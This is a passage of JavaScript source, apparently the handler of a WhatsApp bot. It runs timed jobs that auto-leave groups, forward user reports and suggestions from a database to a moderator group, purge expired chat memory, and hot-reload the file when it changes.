console.log(`[AUTO-LEAVE] Bot salió automáticamente del grupo: ${group_id}`);
} catch (e) {
}}
} catch (e) {
}}, 60_000); //1 min

//report
setInterval(async () => {
const MODGROUP_ID = "120363392819528942@g.us";
try {
let conn = global.conn || globalThis.conn;
if (!conn || typeof conn.sendMessage !== "function") return;
let modsMeta;
try {
modsMeta = await conn.groupMetadata(MODGROUP_ID);
} catch (e) {
return;
}
const res = await db.query("SELECT * FROM reportes WHERE enviado = false ORDER BY fecha ASC LIMIT 10");
if (!res.rows.length) return;

for (const row of res.rows) {
let cabecera = row.tipo === "sugerencia" ? "🌟 *SUGERENCIA*" : "ＲＥＰＯＲＴＥ";
const txt = `┏╼╾╼⧼⧼⧼ ${cabecera}  ⧽⧽⧽╼╼╼┓\n╏• *Usuario:* wa.me/${row.sender_id.split("@")[0]}\n╏• ${row.tipo === "sugerencia" ? "*Sugerencia:*" : "*Mensaje:*"} ${row.mensaje}\n┗╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼`;
await conn.sendMessage(MODGROUP_ID, { text: txt });
await db.query("DELETE FROM reportes WHERE id = $1", [row.id]);
}} catch (err) {
console.error("[REPORT/SUGGE SYSTEM ERROR]", err);
}}, 60_000 * 2); // cada 2 minutos

//cache message 
setInterval(async () => {
try {
const { rows } = await db.query(`SELECT chat_memory.chat_id, chat_memory.updated_at, 
             COALESCE(group_settings.memory_ttl, 86400) AS memory_ttl
      FROM chat_memory
      JOIN group_settings ON chat_memory.chat_id = group_settings.group_id
      WHERE group_settings.memory_ttl > 0
    `);

const now = Date.now();
for (const row of rows) {
const { chat_id, updated_at, memory_ttl } = row;
const lastUpdated = new Date(updated_at).getTime(); // en ms
const ttl = memory_ttl * 1000; 

if (now - lastUpdated > ttl) {
await db.query("DELETE FROM chat_memory WHERE chat_id = $1", [chat_id]);
console.log(`🧹 Memoria del grupo ${chat_id} eliminada automáticamente`);
}}
} catch (err) {
console.error("❌ Error limpiando memorias expiradas:", err);
}}, 300_000); // cada 5 minutos

//---
let file = fileURLToPath(import.meta.url);
watchFile(file, () => {
  unwatchFile(file);
  console.log(chalk.redBright('Update \'handler.js\''));
  import(`${file}?update=${Date.now()}`);
});